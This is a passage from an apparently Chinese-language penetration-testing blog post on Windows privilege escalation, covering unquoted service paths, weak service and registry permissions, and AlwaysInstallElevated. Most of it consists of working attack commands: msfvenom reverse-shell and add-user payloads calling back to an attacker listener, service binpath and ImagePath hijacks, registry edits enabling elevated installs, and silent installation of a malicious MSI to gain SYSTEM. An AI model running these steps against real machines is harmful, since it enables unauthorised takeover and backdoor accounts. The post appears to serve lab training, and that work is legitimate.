+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files (x86)\Program Folder&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>F = 完全控制 </p>
+<p>CI = 容器继承 - 此标志指示从属容器将继承此ACE。 </p>
+<p>OI = Object Inherit - 这个标志表示从属文件将继承ACE</p>
+</blockquote>
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/10.png"></p>
+<ol start="3">
+<li><h6 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">9999</span> <span class="operator">-f</span> exe <span class="literal">-o</span> A.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/11.png"></p>
+<ol start="4">
+<li><h6 id="上传exe到漏洞目录"><a href="#上传exe到漏洞目录" class="headerlink" title="上传exe到漏洞目录"></a>上传exe到漏洞目录</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload A.exe “C:\Program Files (x86)\Program Folder\<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/12.png"></p>
+<ol start="5">
+<li><h6 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h6></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">handler</span> -H <span class="number">192.168.31.246</span> -P <span class="number">9999</span> -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><h6 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> stop <span class="string">&quot;Vulnerable Service”</span></span><br><span class="line"><span class="string">sc start &quot;</span>Vulnerable Service</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/13.png"></p>
+<ol start="7">
+<li><h6 id="设置自动迁移进程，重新开启监听，获取meterpreter"><a href="#设置自动迁移进程，重新开启监听，获取meterpreter" class="headerlink" title="设置自动迁移进程，重新开启监听，获取meterpreter"></a>设置自动迁移进程，重新开启监听，获取meterpreter</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport <span class="number">9999</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line"><span class="built_in">set</span> autorunscript migrate –f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/14.png"></p>
+<h5 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h5><p>Windows系统服务文件在操作系统启动时会加载执行，并且在后台调用可执行文件。</p>
+<p>JAVA升级程序，每次重启系统时，JAVA升级程序会检测Oracle网站，是否有新版JAVA程序。 而类似JAVA程序之类的系统服务程序加载时往往都是运行在系统权限上的。</p>
+<p>所以如果一个低权限的用户对于此类 系统服务调用的可执行文件具有可写的权限，那么就可以修改服务的属性，将其替换成我们的恶意可执行文件，从 而随着系统启动服务而获得系统权限。</p>
+<ol>
+<li><h6 id="利用accesschk工具检查易受到攻击的服务"><a href="#利用accesschk工具检查易受到攻击的服务" class="headerlink" title="利用accesschk工具检查易受到攻击的服务"></a>利用accesschk工具检查易受到攻击的服务</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk64.exe <span class="literal">-ucqv</span> “LYXC<span class="string">&quot; * /accepteula</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/15.png"></p>
+</li>
+<li><h6 id="查看可完全控制的服务的属性"><a href="#查看可完全控制的服务的属性" class="headerlink" title=".查看可完全控制的服务的属性"></a>.查看可完全控制的服务的属性</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> qc <span class="string">&quot;Vulnerable Service&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/16.png"></p>
+</li>
+<li><h6 id="修改服务配置执行命令binpath"><a href="#修改服务配置执行命令binpath" class="headerlink" title="修改服务配置执行命令binpath"></a>修改服务配置执行命令binpath</h6><p>BINARY_PATH_NAME参数指向了该服务的可执行程序(Executable.exe)路径。如果我们将这个值修改成任何命令， 那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> config <span class="string">&quot;Vulnerable Service&quot;</span> binpath= <span class="string">&quot;net user zhangsan 123456 /add&quot;</span></span><br><span class="line"><span class="built_in">sc</span> stop <span class="string">&quot;Vulnerable Service&quot;</span></span><br><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> <span class="string">&quot;Vulnerable Service&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/17.png"></p>
+<blockquote>
+<p>Authenticated Users：指Windows系统中所有使用用户名、密码登录并通过身份验证的账户，不包括来宾账户 Guest。也可以使用当前用户用户名来列出所有可以被当前用户修改的服务。 </p>
+<p>SERVICE_ALL_ACCESS：意思是我们对 Vulnerable Service 的属性拥有完全控制权 </p>
+<p>BINARY_PATH_NAME：参数指向了该服务的可执行程序路径。如果我们将这个值修改成任何命令，那意味着这个 命令在该服务下一次启动时，将会以SYSTEM权限运行。</p>
+</blockquote>
+</li>
+</ol>
+<h5 id="不安全的注册表权限"><a href="#不安全的注册表权限" class="headerlink" title="不安全的注册表权限"></a>不安全的注册表权限</h5><p>Windows中,与服务相关的信息存在 <code>HKLM[HKEY_LOCAL_MACHINE]\SYSTEM\CurrentControlSet\Services</code> 注册表中。 如果想查看有关 “易受攻击的服务”的信息，应该检查 <code>HKLM\SYSTEM\ControlSet\Services\Vulnerable Service</code> 的键值。</p>
+<h6 id="工具：-Subinacl"><a href="#工具：-Subinacl" class="headerlink" title="工具： Subinacl"></a>工具： Subinacl</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.microsoft.com<span class="regexp">/en-us/</span>download/details.aspx?id=<span class="number">23510</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subinacl.exe /keyreg <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot;</span> /display</span><br></pre></td></tr></table></figure>
+
+<p>如果对注册表项有写入权限，我们可以通过编辑ImagePath值来更改此服务的可执行路径。</p>
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/18.png"></p>
+<ol>
+<li><h6 id="msfvenom生成木马"><a href="#msfvenom生成木马" class="headerlink" title="msfvenom生成木马"></a>msfvenom生成木马</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/adduser USER=hacker PASS=Hacker123<span class="variable">$</span> <span class="operator">-f</span> exe &gt; adduser.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/19.png"></p>
+</li>
+<li><h6 id="上传到机器上"><a href="#上传到机器上" class="headerlink" title="上传到机器上"></a>上传到机器上</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload adduser.exe C:\\Windows\\Temp\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/20.png"></p>
+</li>
+<li><h6 id="执行修改命令"><a href="#执行修改命令" class="headerlink" title="执行修改命令"></a>执行修改命令</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="string">&quot;C:\Windows\Temp\adduser.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p>注册表被成功替换</p>
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/21.png"></p>
+</li>
+<li><h6 id="重新启动服务，用户被成功添加"><a href="#重新启动服务，用户被成功添加" class="headerlink" title="重新启动服务，用户被成功添加"></a>重新启动服务，用户被成功添加</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/22.png"></p>
+</li>
+</ol>
+<h5 id="不安全的文件-文件夹权限"><a href="#不安全的文件-文件夹权限" class="headerlink" title="不安全的文件/文件夹权限"></a>不安全的文件/文件夹权限</h5><p>这与我们用非引用服务路径所做的非常相似。无引号的服务路径利用了“CreateProcess”功能的弱点，以及服务 的可执行文件路径的文件夹权限。 </p>
+<p>在这里可以直接替换可执行文件。 </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files (x86)\Program Folder&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p> 默认的服务文件是C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe 将“Executable.exe”文件替换成一个反弹shell payload，并且当服务重启时，会反弹一个SYSTEM权限的 meterpreter 会话</p>
+<h5 id="Always-Install-Elevated"><a href="#Always-Install-Elevated" class="headerlink" title="Always Install Elevated"></a>Always Install Elevated</h5><p>任意用户以NT AUTHORITY\SYSTEM权限安装msi。</p>
+<p>AlwaysInstallElevated是一个策略设置，当在系统中使用Windows Installer安装任何程序时，该参数允许非特权 用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权 限执行任意payload。</p>
+<h6 id="判断是否启用此策略设置："><a href="#判断是否启用此策略设置：" class="headerlink" title="判断是否启用此策略设置："></a>判断是否启用此策略设置：</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v</span><br><span class="line">AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p>收到“错误：系统无法找到指定的注册表项或值”的错误，则表示此注册表值从未创建。 说明政策没有启用。 </p>
+<p>收到“AlwaysInstallElevated REG_DWORD 0x1”，说明策略已经启用。</p>
+<h6 id="启用Always-Install-Elevated"><a href="#启用Always-Install-Elevated" class="headerlink" title="启用Always Install Elevated:"></a>启用Always Install Elevated:</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d <span class="number">1</span> </span><br><span class="line">reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t</span><br><span class="line">REG_DWORD /d <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><h6 id="使用msfvenom生成恶意msi程序上传"><a href="#使用msfvenom生成恶意msi程序上传" class="headerlink" title="使用msfvenom生成恶意msi程序上传"></a>使用msfvenom生成恶意msi程序上传</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">8881</span> <span class="operator">-f</span> exe <span class="literal">-o</span> localmsf8881.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">#反弹shell</span></span><br><span class="line">msfvenom <span class="operator">-f</span> msi<span class="literal">-nouac</span> <span class="literal">-p</span> windows/exec cmd=<span class="string">&quot;C:\Users\LYXC\AppData\Local\Temp\localmsf8882.exe&quot;</span> &gt; malicious.msi</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加用户</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/adduser USER=test PASS=Password@<span class="number">123</span> -<span class="literal">-platform</span> windows <span class="literal">-a</span> x86 <span class="operator">-f</span> msinouac <span class="literal">-o</span> test.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/23.png"></p>
+<ol start="2">
+<li><h6 id="将这两个上传到目标机器"><a href="#将这两个上传到目标机器" class="headerlink" title="将这两个上传到目标机器"></a>将这两个上传到目标机器</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload localmsf8881.exe C:\\Users\\LYXC\\AppData\\Local\\Temp\\</span><br><span class="line">meterpreter &gt; upload malicious.msi C:\\Users\\LYXC\\AppData\\Local\\Temp\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/24.png"></p>
+<ol start="3">
+<li><h6 id="运行恶意程序"><a href="#运行恶意程序" class="headerlink" title="运行恶意程序"></a>运行恶意程序</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Users\LYXC\AppData\Local\temp\malicious.msi</span><br><span class="line"></span><br><span class="line"><span class="comment"># /quiet 安装过程中禁止向用户发送消息</span></span><br><span class="line"><span class="comment"># /qn 不使用GUI</span></span><br><span class="line"><span class="comment"># /i 安装程序</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/25.png"></p>
+<p>直接收到了第二个session</p>
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/26.png"></p>
+<p>但是权限依然只是LYXC，并不是System的最高权限，是因为Metasploit生成的msi文件 在运行时没有要求提升权限，所以导致了这个问题，这时可以使用微软官方的MSI生成工具</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://www.exemsi.com/downloads/msi_wrapper/MSI_Wrapper_<span class="number">9</span>_<span class="number">0</span>_<span class="number">42</span>_<span class="number">0</span>.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/27.png"></p>
+<p>上传malicious.msi至靶机，运行恶意程序</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Users\anthus\AppData\Local\temp\malicious.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/28.png"></p>
+<p>成功提权</p>
+
+    </div>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="成殇Orz1 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="成殇Orz1 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>成殇Orz1
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/" title="Windows提权">http://onlycare.github.io/2021/03/22/Windows主机提权/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tags"></i>渗透测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="Linux主机信息收集">
+      <i class="fa fa-chevron-left"></i> Linux主机信息收集
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E6%AE%87Orz1"><span class="nav-text">成殇Orz1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%A6%82%E8%BF%B0"><span class="nav-text">0x00 权限提升概述</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%A6%82%E8%BF%B0"><span class="nav-text">提权概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows%E7%B3%BB%E7%BB%9F%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84"><span class="nav-text">Windows系统内置用户和组</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E5%88%86%E7%B1%BB"><span class="nav-text">提权分类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6"><span class="nav-text">提权条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF-%E2%80%A2"><span class="nav-text">Windows提权思路 •</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Windows%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">0x01 Windows提权信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96meterpreter"><span class="nav-text">获取meterpreter</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WMIC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">WMIC信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#wmic%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96%E8%84%9A%E6%9C%AC%EF%BC%9Awmic-info-bat"><span class="nav-text">wmic信息提取脚本：wmic_info.bat</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">SC信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">自动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Host-Information-Gathering-Script%EF%BC%9AHIGS-bat"><span class="nav-text">Host Information Gathering Script：HIGS.bat</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#privilege-escalation-awesome-scripts%EF%BC%9AwinPEAS-bat"><span class="nav-text">privilege-escalation-awesome-scripts：winPEAS.bat</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC"><span class="nav-text">提权工具脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#RottenPotato%EF%BC%9A-%E5%B0%86%E6%9C%8D%E5%8A%A1%E5%B8%90%E6%88%B7%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E8%87%B3SYSTEM"><span class="nav-text">RottenPotato： 将服务帐户本地提权至SYSTEM</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SweetPotato"><span class="nav-text">SweetPotato</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Getsystem"><span class="nav-text">Getsystem</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-text">0x02 Windows内核漏洞提权</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#windows-kernel-exploits-Windows%E5%B9%B3%E5%8F%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88"><span class="nav-text">windows-kernel-exploits(Windows平台提权漏洞集合):</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MSF"><span class="nav-text">MSF</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-Windows%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="nav-text">0x03  Windows系统服务漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%AF%E4%BF%A1%E4%BB%BB%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="nav-text">可信任服务路径</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="nav-text">检查目标主机是否可能存在漏洞：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%AF%B9%E6%9C%89%E6%BC%8F%E6%B4%9E%E7%9B%AE%E5%BD%95%E6%98%AF%E5%90%A6%E6%9C%89%E5%86%99%E5%85%A5%E6%9D%83%E9%99%90"><span class="nav-text">检查对有漏洞目录是否有写入权限</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%94%9F%E6%88%90payload"><span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0exe%E5%88%B0%E6%BC%8F%E6%B4%9E%E7%9B%AE%E5%BD%95"><span class="nav-text">上传exe到漏洞目录</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC"><span class="nav-text">开启监听</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%87%8D%E5%90%AF%E6%9C%8D%E5%8A%A1"><span class="nav-text">重启服务</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B%EF%BC%8C%E9%87%8D%E6%96%B0%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC%EF%BC%8C%E8%8E%B7%E5%8F%96meterpreter"><span class="nav-text">设置自动迁移进程，重新开启监听，获取meterpreter</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="nav-text">不安全的服务权限</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A8accesschk%E5%B7%A5%E5%85%B7%E6%A3%80%E6%9F%A5%E6%98%93%E5%8F%97%E5%88%B0%E6%94%BB%E5%87%BB%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="nav-text">利用accesschk工具检查易受到攻击的服务</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E5%AE%8C%E5%85%A8%E6%8E%A7%E5%88%B6%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="nav-text">.查看可完全控制的服务的属性</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4binpath"><span class="nav-text">修改服务配置执行命令binpath</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90"><span class="nav-text">不安全的注册表权限</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A-Subinacl"><span class="nav-text">工具： Subinacl</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="nav-text">msfvenom生成木马</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E5%88%B0%E6%9C%BA%E5%99%A8%E4%B8%8A"><span class="nav-text">上传到机器上</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4"><span class="nav-text">执行修改命令</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 